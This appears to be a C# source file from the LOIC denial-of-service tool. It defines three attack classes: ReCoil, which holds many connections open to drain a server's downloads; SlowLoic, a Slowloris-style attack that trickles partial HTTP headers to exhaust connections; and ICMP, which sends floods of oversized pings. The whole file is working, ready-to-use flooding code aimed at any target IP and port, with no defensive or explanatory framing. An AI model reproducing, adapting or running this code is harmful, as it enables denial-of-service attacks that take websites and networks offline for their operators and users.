/// SwatticusDevelopment

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;

namespace LOIC
{
	public abstract class cHLDos : IFlooder
	{
		public ReqState State = ReqState.Ready;

		public bool IsDelayed { get; set; }

		public bool IsFlooding { get; set; }

		public int Requested { get; set; }

		public int Downloaded { get; set; }

		public int Failed { get; set; }

		public int Delay { get; set; }

		public int Timeout { get; set; }

		public virtual void Start()
		{ }

		public virtual void Stop()
		{
			IsFlooding = false;
			IsDelayed = true;
		}

		public virtual bool Test()
		{
			return true;
		}
	}

	public class ReCoil : cHLDos
	{
		private string _dns;
		private string _ip;
		private int _port;
		private string _subSite;
		private bool _random;
		private bool _usegZip;
		private bool _resp;

		private int _nSockets;
		private List<Socket> _lSockets  = new List<Socket>();
		private BackgroundWorker bw;

		public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip)
		{
			this._dns = (dns == "") ? ip : dns; 
			this._ip = ip;
			this._port = port;
			this._subSite = subSite;
			this._nSockets = nSockets;
			if (timeout <= 0)
			{
				this.Timeout = 30000; // 30 seconds
			}
			else
			{
				this.Timeout = timeout * 1000;
			}
			this.Delay = delay+1;
			this._random = random;
			this._usegZip = usegZip;
			this._resp = resp;
			this.IsDelayed = true;
			Requested = 0; 
		}
		public override void Start()
		{
			this.IsFlooding = true;
			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public override void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				int bsize = 16;
				int mincl = 16384; 
				byte[] rbuf = new byte[bsize];
				string redirect = "";
				DateTime stop = DateTime.UtcNow;
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);

				State = ReqState.Ready;
				while (this.IsFlooding)
				{
					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
					State = ReqState.Connecting; 

					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
					{
						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
						socket.ReceiveTimeout = Timeout;
						socket.ReceiveBufferSize = bsize;
						try
						{
							socket.Connect(RHost);
							socket.Blocking = _resp; 
							byte[] sbuf = Functions.RandomHttpHeader("GET", _subSite, _dns, _random, _usegZip, 300);
							socket.Send(sbuf);
						}
						catch { }

						if (socket.Connected)
						{
							bool keeps = !_resp;
							if (_resp)
							{
								do
								{ 
									if (redirect != "")
									{
										if (!socket.Connected)
										{
											socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
											socket.ReceiveTimeout = Timeout;
											socket.ReceiveBufferSize = bsize;
											socket.Connect(RHost);
										}
										byte[] sbuf = Functions.RandomHttpHeader("GET", redirect, _dns, false, _usegZip, 300);
										socket.Send(sbuf);
										redirect = "";
									}
									keeps = false;
									try
									{
										string header = "";
										while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
										{
											header += Encoding.ASCII.GetString(rbuf);
										}
										string[] sp = header.Split(new char[]{'\r','\n'}, StringSplitOptions.RemoveEmptyEntries);
										for (int i = (sp.Length - 1); this.IsFlooding && i >= 0; i--)
										{
											string[] tsp = sp[i].Split(new char[]{':'}, 2, StringSplitOptions.RemoveEmptyEntries);

											if (tsp.Length != 2)
												continue;

											tsp[0] = tsp[0].Trim();
											tsp[1] = tsp[1].Trim();

											if (tsp[0] == "Location")
											{ 
												redirect = tsp[1];
												if (!redirect.StartsWith("/"))
												{
													try { redirect = new Uri(redirect).PathAndQuery; }
													catch { redirect = ""; }
												}
												break;
											}
											else if (tsp[0] == "Content-Length")
											{ 
												int sl = 0;
												if (int.TryParse(tsp[1], out sl) && sl >= mincl)
												{
													keeps = true;
													break;
												}
											}
											else if (tsp[0] == "Transfer-Encoding" && tsp[1].ToLowerInvariant() == "chunked")
											{ 
												keeps = true;
												break;
											}
										}
									}
									catch
									{ }
								} while (redirect != "" && DateTime.UtcNow < stop);

								if (!keeps)
									Failed++;
							}
							if (keeps)
							{
								socket.Blocking = true;
								_lSockets.Insert(0, socket);
								Requested++;
							}
						}
						if (_lSockets.Count >= _nSockets)
						{
							this.IsDelayed = false;
						}
						else if (Delay > 0)
						{
							System.Threading.Thread.Sleep(Delay);
						}
					}

					State = ReqState.Downloading;
					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
					{
						try
						{
							if (!_lSockets[i].Connected || (_lSockets[i].Receive(rbuf) < bsize))
							{
								_lSockets.RemoveAt(i);
								Failed++;
								Requested--; 
							}
							else
							{
								Downloaded++;
							}
						}
						catch
						{
							_lSockets.RemoveAt(i);
							Failed++;
							Requested--;
						}
					}

					State = ReqState.Completed;
					this.IsDelayed = (_lSockets.Count < _nSockets);
					if (!this.IsDelayed)
					{
						System.Threading.Thread.Sleep(Timeout);
					}
				}
			}
			catch
			{
				State = ReqState.Failed;
			}
			finally
			{
				this.IsFlooding = false;
				for (int i = (_lSockets.Count - 1); i >= 0; i--)
				{
					try
					{
						_lSockets[i].Close();
					}
					catch { }
				}
				_lSockets.Clear();
				State = ReqState.Ready;
				this.IsDelayed = true;
			}
		}
	} 

	public class SlowLoic : cHLDos
	{
		private string _dns;
		private string _ip;
		private int _port;
		private string _subSite;
		private bool _random;
		private bool _randcmds;
		private bool _useget;
		private bool _usegZip;

		private int _nSockets;
		private BackgroundWorker bw;
		private List<Socket> _lSockets  = new List<Socket>();

		public SlowLoic(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool randcmds, bool useGet, bool usegZip)
		{
			this._dns = (dns == "") ? ip : dns; 
			this._port = port;
			this._subSite = subSite;
			this._nSockets = nSockets;
			if (timeout <= 0)
			{
				this.Timeout = 30000; // 30 seconds
			}
			else
			{
				this.Timeout = timeout * 1000;
			}
			this.Delay = delay;
			this._random = random;
			this._randcmds = randcmds;
			this._useget = useGet;
			this._usegZip = usegZip;
			this.IsDelayed = true;
			Requested = 0; 
		}
		public override void Start()
		{
			this.IsFlooding = true;
			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public override void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] sbuf = Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
				byte[] tbuf = Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
				DateTime stop = DateTime.UtcNow;
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);

				State = ReqState.Ready;
				while (this.IsFlooding)
				{
					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
					State = ReqState.Connecting;

					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
					{
						if (_random == true)
							sbuf = Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));

						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
						try
						{
							socket.Connect(RHost);
							socket.NoDelay = true;
							socket.Blocking = false;
							socket.Send(sbuf);
						}
						catch
						{ }

						if (socket.Connected)
						{
							_lSockets.Add(socket);
							Requested++;
						}
						this.IsDelayed = (_lSockets.Count < _nSockets);
						if (this.IsFlooding && this.IsDelayed && (Delay > 0))
						{
							System.Threading.Thread.Sleep(Delay);
						}
					}
					State = ReqState.Requesting;
					if (_randcmds)
					{
						tbuf = Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
					}
					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
					{ 
						try
						{
							if (!_lSockets[i].Connected || (_lSockets[i].Send(tbuf) <= 0))
							{
								_lSockets.RemoveAt(i);
								Failed++;
								Requested--;
							}
							else
							{
								Downloaded++;
							}
						}
						catch
						{
							_lSockets.RemoveAt(i);
							Failed++;
							Requested--;
						}
					}

					State = ReqState.Completed;
					this.IsDelayed = (_lSockets.Count < _nSockets);
					if (!this.IsDelayed)
					{
						System.Threading.Thread.Sleep(Timeout);
					}
				}
			}
			catch
			{
				State = ReqState.Failed;
			}
			finally
			{
				this.IsFlooding = false;
				for (int i = (_lSockets.Count - 1); i >= 0; i--)
				{
					try
					{
						_lSockets[i].Close();
					}
					catch { }
				}
				_lSockets.Clear();
				State = ReqState.Ready;
				this.IsDelayed = true;
			}
		}
	} 
    public class ICMP : cHLDos
    {
        private string _ip;
        private int _PingsPerThread;
        private byte[] _BytesToSend;
        private Ping _pingSender;
        private PingOptions _opt;
        private bool _RandomMessage;
        private BackgroundWorker bw;

        public ICMP(string ip, int delay, bool RandomMessage, int PingsPerThread)
        {
            this.Delay = delay;

            this._ip = ip;
            this._PingsPerThread = PingsPerThread;
            this._pingSender = new Ping();
            this._RandomMessage = RandomMessage;
            this._BytesToSend = new byte[65000];

            this._opt = new PingOptions();
            this._opt.Ttl = 128;

            if (RandomMessage)
            {
                this._opt.DontFragment = false;
            }
            else
            {
                this._opt.DontFragment = true;
            }
        }

        public override void Start()
        {
            this.IsFlooding = true;
            this.bw = new BackgroundWorker();
            this.bw.DoWork += bw_DoWork;
            this.bw.RunWorkerAsync();
            this.bw.WorkerSupportsCancellation = true;
        }

        public override void Stop()
        {
            this.IsFlooding = false;
            this.bw.CancelAsync();
        }
        private  void bw_DoWork (object sender, EventArgs e)
        {
            while (this.IsFlooding)
            {
                _BytesToSend = new Byte[0];

                if (_RandomMessage)
                {
                    _BytesToSend = new Byte[655000];
                    int b = 0;
                    while (b < Functions.RandomInt(0,654990))
                    {
                        this._BytesToSend[b] = Convert.ToByte(Functions.RandomInt(0, 255));
                        b++;
                    }
                }

                State = ReqState.Ready;

                for (int i = 0; i < _PingsPerThread && this.IsFlooding; i++)
                {
                    State = ReqState.Connecting;
                    try
                    {
                        _pingSender.SendAsync(_ip, 10, _BytesToSend, _opt);
                        Requested++;
                    }
                    catch (Exception)
                    {
                        Failed++;
                    }
                    try
                    {
                        _pingSender.SendAsyncCancel();
                        _pingSender.Dispose();
                    }
                    catch { }
                    State = ReqState.Completed;
                }

                if (this.IsFlooding && Delay > 0)
                {
                    System.Threading.Thread.Sleep(Delay);
                }

                State = ReqState.Ready;
            }
        }
    }
}